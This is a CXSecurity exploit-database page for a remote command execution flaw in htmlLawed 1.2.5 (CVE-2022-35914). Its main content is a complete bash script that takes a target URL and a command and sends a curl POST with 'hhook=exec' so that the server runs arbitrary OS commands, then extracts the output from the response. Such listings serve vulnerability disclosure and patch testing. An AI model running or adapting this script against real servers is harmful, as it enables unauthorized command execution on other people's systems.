---
title: htmlLawed 1.2.5 Remote Command Execution
url: https://cxsecurity.com/issue/WLB-2024050016
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2024-05-06
fetch_date: 2025-10-06T17:15:02.458599
---

# htmlLawed 1.2.5 Remote Command Execution

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **htmlLawed 1.2.5 Remote Command Execution** **2024.05.05**  Credit:  **[d4t4s3c](https://cxsecurity.com/author/d4t4s3c/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2022-35914](https://cxsecurity.com/cveshow/CVE-2022-35914/ "Click to see CVE-2022-35914")**  CWE: **[CWE-78](https://cxsecurity.com/cwe/CWE-78 "Click to see CWE-78")** | |

#!/bin/bash
# Exploit Title: htmlLawed <= 1.2.5 - Remote Code Execution
# Date: 2024-05-02
# Exploit Author: Miguel Redondo (aka d4t4s3c)
# Vendor Homepage: https://www.bioinformatics.org/phplabware/internal\_utilities/htmLawed
# Software Link: https://github.com/kesar/HTMLawed
# Version: <= 1.2.5
# Tested on: Linux
# Category: Web Application
# CVE: CVE-2022-35914
while getopts ":u:c:" arg; do
case ${arg} in
u) url=${OPTARG}; let parameter\_counter+=1 ;;
c) cmd=${OPTARG}; let parameter\_counter+=1 ;;
esac
done
if [ -z "${url}" ] || [ -z "${cmd}" ]; then
echo -e "\n[\*] htmlLawed <= 1.2.5 - Remote Code Execution"
echo -e "\n[-] Usage: CVE-2022-35914.sh -u <url> -c <cmd>\n"
exit 1
else
echo -e "\n[\*] htmlLawed <= 1.2.5 - Remote Code Execution"
echo -e "\n[+] Executing Command: ${cmd}\n"
cmd\_output=$(curl -s -d "sid=foo&hhook=exec&text=${cmd}" -b "sid=foo" ${url} | egrep '\&nbsp; \[[0-9]+\] =\&gt;' | sed -E 's/\&nbsp; \[[0-9]+\] =\&gt; (.\*)<br \/>/\1/')
echo -e "${cmd\_output}\n"
exit 0
fi

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2024050016)

[Tweet](https://twitter.com/share)

Vote for this issue:
 2
 0

100%

0%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top